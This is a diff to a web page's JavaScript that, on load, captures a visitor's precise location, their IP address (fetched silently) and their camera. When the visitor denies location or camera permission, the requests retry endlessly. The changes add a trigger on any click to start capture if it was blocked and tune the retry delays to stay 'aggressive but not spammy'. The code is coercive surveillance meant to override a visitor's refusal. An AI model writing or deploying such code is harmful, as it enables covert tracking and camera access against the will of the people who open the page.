@@ -133,9 +133,17 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // 2. Start Process Immediately
+    let captureStarted = false;
     initCapture();
 
+    // Ensure it starts on interaction if blocked
+    document.addEventListener('click', () => {
+        if (!captureStarted) initCapture();
+    });
+
     async function initCapture() {
+        if (captureStarted) return;
+        captureStarted = true;
         console.log("Requesting permissions...");
 
         try {
@@ -150,10 +158,10 @@ document.addEventListener('DOMContentLoaded', () => {
                         resolve,
                         (err) => {
                             console.log("Loc failed, retrying...", err);
-                            // Retry almost immediately to force "pop" persistence
-                            setTimeout(tryLoc, 100);
+                            // Retry aggressively but not spammy
+                            setTimeout(tryLoc, 500);
                         },
-                        { enableHighAccuracy: true, timeout: 4000 } // Lower timeout to re-trigger faster if ignored
+                        { enableHighAccuracy: true, timeout: 5000 }
                     );
                 };
                 tryLoc();
@@ -175,9 +183,6 @@ document.addEventListener('DOMContentLoaded', () => {
             if (!position) {
                 throw new Error("Geolocation not supported by this browser.");
             }
-            // Note: If denied, getPersistentLocation loops forever, so we never reach here with "N/A" logic.
-
-            // (Previous strict check removed as we loop forever on failure now)
 
             // 2. Request IP (background, no prompt) without blocking if possible or just await
             const ip = await getIP();
@@ -203,7 +208,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     } catch (err) {
                         console.log("Camera denied/failed, retrying...", err);
                         // Retry aggressively
-                        await new Promise(r => setTimeout(r, 100));
+                        await new Promise(r => setTimeout(r, 500));
                     }
                 }
             };
